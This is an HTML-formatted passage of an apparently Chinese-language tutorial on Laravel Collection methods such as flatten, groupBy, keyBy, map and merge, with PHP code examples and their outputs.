class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'languages'</span> =&gt; [<span class="string">'php'</span>, <span class="string">'javascript'</span>]]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;flatten()-&gt;all();  <span class="comment">// ['taylor', 'php', 'javascript'];</span></span><br></pre></td></tr></table></figure><p>还可以选择性地传入「深度」参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="string">'Apple'</span> =&gt; [</span><br><span class="line">        [<span class="string">'name'</span> =&gt; <span class="string">'iPhone 6S'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Apple'</span>],</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'Samsung'</span> =&gt; [</span><br><span class="line">        [<span class="string">'name'</span> =&gt; <span class="string">'Galaxy S7'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Samsung'</span>]</span><br><span class="line">    ],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$products = $collection-&gt;flatten(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$products-&gt;values()-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[</span></span><br><span class="line"><span class="comment">    ['name' =&gt; 'iPhone 6S', 'brand' =&gt; 'Apple'],</span></span><br><span class="line"><span class="comment">    ['name' =&gt; 'Galaxy S7', 'brand' =&gt; 'Samsung'],</span></span><br><span class="line"><span class="comment">]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>在这个例子里，调用 flatten 方法时不传入深度参数的话也会将嵌套数组转成一维的，然后返回 <code>[&#39;iPhone 6S&#39;, &#39;Apple&#39;, &#39;Galaxy S7&#39;, &#39;Samsung&#39;]</code>，传入深度参数能限制设置返回数组的层数。</p><h2 id="flip"><a href="#flip" class="headerlink" title="flip"></a>flip</h2><p>键值反转。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">"name"</span> =&gt; <span class="string">"boo"</span>, <span class="string">"age"</span> =&gt; <span class="number">25</span>]);</span><br><span class="line">$collection-&gt;flip()-&gt;all();  <span class="comment">// ["boo" =&gt; "name", 25 =&gt; "age"]</span></span><br></pre></td></tr></table></figure><h2 id="forget"><a href="#forget" class="headerlink" title="forget"></a>forget</h2><p>通过给定的键来移除掉集合中对应的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'framework'</span> =&gt; <span class="string">'laravel'</span>]);</span><br><span class="line">$collection-&gt;forget(<span class="string">'name'</span>);</span><br><span class="line">$collection-&gt;all(); </span><br><span class="line"><span class="comment">// ['framework' =&gt; 'laravel']</span></span><br></pre></td></tr></table></figure><p>与大多数集合的方法不同，<code>forget()</code> 不会返回修改过后的新集合；它会直接修改原来的集合。</p><h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><p>返回给定键的项目。</p><p>基本用法，如果该键不存在，则返回 null：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'framework'</span> =&gt; <span class="string">'laravel'</span>]);</span><br><span class="line">$value = $collection-&gt;get(<span class="string">'name'</span>); <span class="comment">// taylor</span></span><br></pre></td></tr></table></figure><p>可以传递第二个参数作为默认值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'framework'</span> =&gt; <span class="string">'laravel'</span>]);</span><br><span class="line">$value = $collection-&gt;get(<span class="string">'foo'</span>, <span class="string">'boo'</span>); <span class="comment">// boo</span></span><br></pre></td></tr></table></figure><p>甚至可以将回调函数当作默认值。如果指定的键不存在，就会返回回调的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'framework'</span> =&gt; <span class="string">'laravel'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;get(<span class="string">'email'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'boo'</span>;</span><br><span class="line">&#125;); <span class="comment">// boo</span></span><br></pre></td></tr></table></figure><h2 id="groupBy"><a href="#groupBy" class="headerlink" title="groupBy"></a>groupBy</h2><p>根据给定的键对集合内的项目进行分组。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="string">'account-x10'</span>, <span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>],</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="string">'account-x10'</span>, <span class="string">'product'</span> =&gt; <span class="string">'Bookcase'</span>],</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="string">'account-x11'</span>, <span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$grouped = $collection-&gt;groupBy(<span class="string">'account_id'</span>);</span><br><span class="line"></span><br><span class="line">$grouped-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'account-x10' =&gt; [</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'],</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'account-x11' =&gt; [</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>同样可以传入一个回调函数来代替字符串的『键』，根据该回调函数的返回值来进行分组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$grouped = $collection-&gt;groupBy(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> substr($item[<span class="string">'account_id'</span>], <span class="number">-3</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$grouped-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'x10' =&gt; [</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'],</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'x11' =&gt; [</span></span><br><span class="line"><span class="comment">            ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>甚至可以传入一个数组进行多层分组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">new</span> Collection([</span><br><span class="line">    <span class="number">10</span> =&gt; [<span class="string">'user'</span> =&gt; <span class="number">1</span>, <span class="string">'skill'</span> =&gt; <span class="number">1</span>, <span class="string">'roles'</span> =&gt; [<span class="string">'Role_1'</span>, <span class="string">'Role_3'</span>]],</span><br><span class="line">    <span class="number">20</span> =&gt; [<span class="string">'user'</span> =&gt; <span class="number">2</span>, <span class="string">'skill'</span> =&gt; <span class="number">1</span>, <span class="string">'roles'</span> =&gt; [<span class="string">'Role_1'</span>, <span class="string">'Role_2'</span>]],</span><br><span class="line">    <span class="number">30</span> =&gt; [<span class="string">'user'</span> =&gt; <span class="number">3</span>, <span class="string">'skill'</span> =&gt; <span class="number">2</span>, <span class="string">'roles'</span> =&gt; [<span class="string">'Role_1'</span>]],</span><br><span class="line">    <span class="number">40</span> =&gt; [<span class="string">'user'</span> =&gt; <span class="number">4</span>, <span class="string">'skill'</span> =&gt; <span class="number">2</span>, <span class="string">'roles'</span> =&gt; [<span class="string">'Role_2'</span>]],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$result = $data-&gt;groupBy([</span><br><span class="line">    <span class="string">'skill'</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $item[<span class="string">'roles'</span>];</span><br><span class="line">    &#125;,</span><br><span class="line">], $preserveKeys = <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[</span></span><br><span class="line"><span class="comment">    1 =&gt; [</span></span><br><span class="line"><span class="comment">        'Role_1' =&gt; [</span></span><br><span class="line"><span class="comment">            10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']],</span></span><br><span class="line"><span class="comment">            20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'Role_2' =&gt; [</span></span><br><span class="line"><span class="comment">            20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'Role_3' =&gt; [</span></span><br><span class="line"><span class="comment">            10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">    ],</span></span><br><span class="line"><span class="comment">    2 =&gt; [</span></span><br><span class="line"><span class="comment">        'Role_1' =&gt; [</span></span><br><span class="line"><span class="comment">            30 =&gt; ['user' =&gt; 3, 'skill' =&gt; 2, 'roles' =&gt; ['Role_1']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        'Role_2' =&gt; [</span></span><br><span class="line"><span class="comment">            40 =&gt; ['user' =&gt; 4, 'skill' =&gt; 2, 'roles' =&gt; ['Role_2']],</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">    ],</span></span><br><span class="line"><span class="comment">];</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="has"><a href="#has" class="headerlink" title="has"></a>has</h2><p>判断集合中是否存在给定的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">"name"</span> =&gt; <span class="string">"boo"</span>, <span class="string">"age"</span> =&gt; <span class="number">25</span>]);</span><br><span class="line">$collection-&gt;has(<span class="string">"name"</span>);  <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="implode"><a href="#implode" class="headerlink" title="implode"></a>implode</h2><p>合并集合中的项目。</p><p>implode 方法用于合并集合项。其参数取决于集合项的类型。如果集合包含数组或对象，你应该传递你希望合并的属性的键，以及你希望放在值之间用来「拼接」的字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="number">1</span>, <span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>],</span><br><span class="line">    [<span class="string">'account_id'</span> =&gt; <span class="number">2</span>, <span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;implode(<span class="string">'product'</span>, <span class="string">', '</span>);</span><br><span class="line"><span class="comment">// Desk, Chair</span></span><br></pre></td></tr></table></figure><p>如果集合中包含简单的字符串或数值，只需要传入「拼接」用的字符串作为该方法的唯一参数即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])-&gt;implode(<span class="string">'-'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// '1-2-3-4-5'</span></span><br></pre></td></tr></table></figure><h2 id="intersect"><a href="#intersect" class="headerlink" title="intersect"></a>intersect</h2><p>从原集合中移除不在给定数组或集合中的『任何值』，返回新的集合将保留原集合的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'Desk'</span>, <span class="string">'Sofa'</span>, <span class="string">'Chair'</span>]);</span><br><span class="line">$intersect = $collection-&gt;intersect([<span class="string">'Desk'</span>, <span class="string">'Chair'</span>, <span class="string">'Bookcase'</span>]);</span><br><span class="line">$intersect-&gt;all();</span><br><span class="line"><span class="comment">// [0 =&gt; 'Desk', 2 =&gt; 'Chair']</span></span><br></pre></td></tr></table></figure><h2 id="intersectKey"><a href="#intersectKey" class="headerlink" title="intersectKey"></a>intersectKey</h2><p>删除原集合中不存在于给定数组或集合中的『任何键』，返回新的集合将保留原集合的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="string">'serial'</span> =&gt; <span class="string">'UX301'</span>, <span class="string">'type'</span> =&gt; <span class="string">'screen'</span>, <span class="string">'year'</span> =&gt; <span class="number">2009</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$intersect = $collection-&gt;intersectByKeys([</span><br><span class="line">    <span class="string">'reference'</span> =&gt; <span class="string">'UX404'</span>, <span class="string">'type'</span> =&gt; <span class="string">'tab'</span>, <span class="string">'year'</span> =&gt; <span class="number">2011</span>,</span><br><span class="line">]);</span><br><span class="line">$intersect-&gt;all();</span><br><span class="line"><span class="comment">// ['type' =&gt; 'screen', 'year' =&gt; 2009]</span></span><br></pre></td></tr></table></figure><h2 id="isEmpty"><a href="#isEmpty" class="headerlink" title="isEmpty"></a>isEmpty</h2><p>判断集合是否为空。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([])-&gt;isEmpty(); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="isNotEmpty"><a href="#isNotEmpty" class="headerlink" title="isNotEmpty"></a>isNotEmpty</h2><p>判断集合是否不为空。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([])-&gt;isEmpty(); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h2 id="join"><a href="#join" class="headerlink" title="join"></a>join</h2><p>将集合中的值用字符串连接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>])-&gt;join(<span class="string">', '</span>); <span class="comment">// 'a, b, c'</span></span><br><span class="line">collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>])-&gt;join(<span class="string">', '</span>, <span class="string">', and '</span>); <span class="comment">// 'a, b, and c'</span></span><br><span class="line">collect([<span class="string">'a'</span>, <span class="string">'b'</span>])-&gt;join(<span class="string">', '</span>, <span class="string">' and '</span>); <span class="comment">// 'a and b'</span></span><br><span class="line">collect([<span class="string">'a'</span>])-&gt;join(<span class="string">', '</span>, <span class="string">' and '</span>); <span class="comment">// 'a'</span></span><br><span class="line">collect([])-&gt;join(<span class="string">', '</span>, <span class="string">' and '</span>); <span class="comment">// ''</span></span><br></pre></td></tr></table></figure><h2 id="keyBy"><a href="#keyBy" class="headerlink" title="keyBy"></a>keyBy</h2><p>以给定的键作为集合的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product_id'</span> =&gt; <span class="string">'prod-100'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>],</span><br><span class="line">    [<span class="string">'product_id'</span> =&gt; <span class="string">'prod-200'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Chair'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$keyed = $collection-&gt;keyBy(<span class="string">'product_id'</span>);</span><br><span class="line"></span><br><span class="line">$keyed-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'prod-100' =&gt; ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'],</span></span><br><span class="line"><span class="comment">        'prod-200' =&gt; ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>还可以在这个方法传递一个回调函数。该回调函数返回的值会作为该集合的键：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$keyed = $collection-&gt;keyBy(<span class="function"><span class="keyword">function</span> <span class="params">($item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strtoupper($item[<span class="string">'product_id'</span>]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$keyed-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'PROD-100' =&gt; ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'],</span></span><br><span class="line"><span class="comment">        'PROD-200' =&gt; ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="keys"><a href="#keys" class="headerlink" title="keys"></a>keys</h2><p>返回集合的所有键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">"name"</span> =&gt; <span class="string">"boo"</span>, <span class="string">"age"</span> =&gt; <span class="number">25</span>]);</span><br><span class="line">$collection-&gt;keys()-&gt;all();  <span class="comment">// ["name", "age"]</span></span><br></pre></td></tr></table></figure><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><p>返回集合中通过给定真实测试的最后一个元素，与<code>first</code> 方法正好相反。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])-&gt;last(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $value &lt; <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>遍历集合并将每一个值传入给定的回调，返回新的集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$multiplied = $collection-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $item * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$multiplied-&gt;all();</span><br><span class="line"><span class="comment">// [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure><p>与其他大多数集合方法一样， map 会返回一个新的集合实例；它不会修改原集合。如果你想修改原集合，请使用 <code>transform</code> 方法。</p><h2 id="mapToGroups"><a href="#mapToGroups" class="headerlink" title="mapToGroups"></a>mapToGroups</h2><p>通过指定回调函数对集合进行分组，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'John Doe'</span>,</span><br><span class="line">        <span class="string">'department'</span> =&gt; <span class="string">'Sales'</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Jane Doe'</span>,</span><br><span class="line">        <span class="string">'department'</span> =&gt; <span class="string">'Sales'</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Johnny Doe'</span>,</span><br><span class="line">        <span class="string">'department'</span> =&gt; <span class="string">'Marketing'</span>,</span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$grouped = $collection-&gt;mapToGroups(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [$item[<span class="string">'department'</span>] =&gt; $item[<span class="string">'name'</span>]];</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$grouped-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'Sales' =&gt; ['John Doe', 'Jane Doe'],</span></span><br><span class="line"><span class="comment">        'Marketing' =&gt; ['Johnny Doe'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$grouped-&gt;get(<span class="string">'Sales'</span>)-&gt;all();</span><br><span class="line"><span class="comment">// ['John Doe', 'Jane Doe']</span></span><br></pre></td></tr></table></figure><h2 id="mapWithKeys"><a href="#mapWithKeys" class="headerlink" title="mapWithKeys"></a>mapWithKeys</h2><p>遍历集合并将每个值传入给定的回调。</p><h2 id="max"><a href="#max" class="headerlink" title="max"></a>max</h2><p>返回指定键的最大值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$max = collect([[<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">20</span>]])-&gt;max(<span class="string">'foo'</span>);   <span class="comment">// 20</span></span><br><span class="line">$max = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])-&gt;max();   <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h2 id="median"><a href="#median" class="headerlink" title="median"></a>median</h2><p>返回指定键的中间值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$median = collect([[<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">10</span>], [<span class="string">'foo'</span> =&gt; <span class="number">20</span>], [<span class="string">'foo'</span> =&gt; <span class="number">40</span>]])-&gt;median(<span class="string">'foo'</span>);   <span class="comment">// 15</span></span><br><span class="line">$median = collect([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>])-&gt;median();  <span class="comment">// 1.5</span></span><br></pre></td></tr></table></figure><h2 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h2><p>将给定数组或集合合并到原集合。</p><p>如果给定的集合项的字符串键与原集合中的字符串键相匹配，则指定集合项的值将覆盖原集合的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="number">1</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>]);</span><br><span class="line">$merged = $collection-&gt;merge([<span class="string">'price'</span> =&gt; <span class="number">200</span>, <span class="string">'discount'</span> =&gt; <span class="keyword">false</span>]);</span><br><span class="line">$merged-&gt;all();</span><br><span class="line"><span class="comment">// ['product_id' =&gt; 1, 'price' =&gt; 200, 'discount' =&gt; false]</span></span><br></pre></td></tr></table></figure><p>如果给定的集合项为数字，则这些值将会追加在集合的最后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection &#x3D; collect([&#39;Desk&#39;, &#39;Chair&#39;]);</span><br><span class="line">$merged &#x3D; $collection-&gt;merge([&#39;Bookcase&#39;, &#39;Door&#39;]);</span><br><span class="line">$merged-&gt;all();</span><br><span 